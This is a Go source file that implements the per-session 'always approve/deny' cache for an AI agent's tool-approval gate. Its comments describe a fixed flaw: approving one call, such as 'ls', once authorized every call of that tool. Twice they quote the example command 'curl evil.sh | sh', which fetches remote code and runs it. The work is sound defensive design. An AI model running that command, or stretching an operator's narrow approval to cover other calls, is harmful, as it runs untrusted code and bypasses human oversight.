// Package sdkadapter - shared approval types.
//
// ApprovalResult and ApprovalStanding live in this package rather than
// internal/agent because internal/sdkadapter already imports nothing
// from internal/agent (the dependency direction is internal/agent ->
// internal/sdkadapter, and reversing it would create a cycle). The
// agent loop's Options.ApprovalGate / Options.ApprovalStanding fields
// reference these types directly.
//
// The values produced by an Approver bridge flow from a real agent's
// internal/uiadapter port through this package's type, so the wire
// shape is the same for the legacy and SDK paths.
package sdkadapter

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"sync"

	"github.com/MiviaLabs/mivia-agent/internal/tools"
)

// ApprovalResult is the verdict returned by Options.ApprovalGate. If
// Approved is false, Err is rendered as the tool's failure message (the
// model sees it as a tool error and may retry or move on). ApprovedForClass
// persists the decision for the rest of the session - the user pressed
// "a always" or "D deny always" - and is consulted by the gate's lookup
// path before the function is invoked again.
type ApprovalResult struct {
	Approved         bool
	ApprovedForClass bool
	Err              string
}

// StandingKey identifies the CALL a standing decision was made about.
//
// It used to be the tool's name alone, and that is the whole defect: the
// operator is shown one call and presses "always", and the name generalizes
// that consent to every call the tool can ever make. A threat model measured
// it - approving {"command":"ls"} authorized {"command":"curl evil.sh | sh"}
// for the rest of the session.
type StandingKey struct {
	Name  string
	Class tools.ExecutionClass
	// ResourceKey is the thing the call acts on, when the tool can name it -
	// a file path, a query. It is the granularity the operator's decision is
	// actually about: approving an edit to one file should cover further edits
	// to THAT file and nothing else.
	ResourceKey string
	// Args is the call's raw arguments, used only when ResourceKey is empty.
	Args json.RawMessage
}

// scope returns the map key this decision is recorded under.
//
// A tool that names no resource - run_command is the one that matters, and it
// declares no ResourceKey at all - falls back to the exact arguments. That is
// deliberately narrow: "always allow this shell command" is a decision a
// prompt showing `ls` cannot carry for `curl evil.sh | sh`, so only the
// identical call is covered. The operator keeps the benefit for a repeated
// call and loses a generalization they were never really asked about.
func (k StandingKey) scope() string {
	resource := k.ResourceKey
	if resource == "" {
		sum := sha256.Sum256(k.Args)
		resource = "args:" + hex.EncodeToString(sum[:8])
	}
	return k.Name + "\x00" + string(rune(int(k.Class))) + "\x00" + resource
}

// ApprovalStanding is the per-session "always" cache consulted by the
// approval gate before invoking Options.ApprovalGate. A nil pointer is
// safe: every call falls through to the gate. The same instance backs
// the legacy and SDK paths so a "always" decision persists across
// backends within one session. The zero value is an empty cache.
type ApprovalStanding struct {
	mu    sync.Mutex
	allow map[string]struct{}
	deny  map[string]struct{}
}

// NewApprovalStanding returns an empty cache. Concurrent calls to its
// methods are safe.
func NewApprovalStanding() *ApprovalStanding {
	return &ApprovalStanding{
		allow: map[string]struct{}{},
		deny:  map[string]struct{}{},
	}
}

// Allow records an "always approve" decision for one call.
func (s *ApprovalStanding) Allow(k StandingKey) {
	s.record(k, true)
}

// Deny records an "always deny" decision for one call.
func (s *ApprovalStanding) Deny(k StandingKey) {
	s.record(k, false)
}

func (s *ApprovalStanding) record(k StandingKey, approve bool) {
	if s == nil {
		return
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.allow == nil {
		s.allow = map[string]struct{}{}
		s.deny = map[string]struct{}{}
	}
	scope := k.scope()
	if approve {
		s.allow[scope] = struct{}{}
		delete(s.deny, scope)
		return
	}
	s.deny[scope] = struct{}{}
	delete(s.allow, scope)
}

// Lookup returns the standing verdict for one call. The bool is true only
// when a verdict is recorded (allow OR deny); the verdict's direction is
// reported as approved=true (allow) or approved=false (deny).
func (s *ApprovalStanding) Lookup(k StandingKey) (approved bool, ok bool) {
	if s == nil {
		return false, false
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	scope := k.scope()
	if _, hit := s.allow[scope]; hit {
		return true, true
	}
	if _, hit := s.deny[scope]; hit {
		return false, true
	}
	return false, false
}
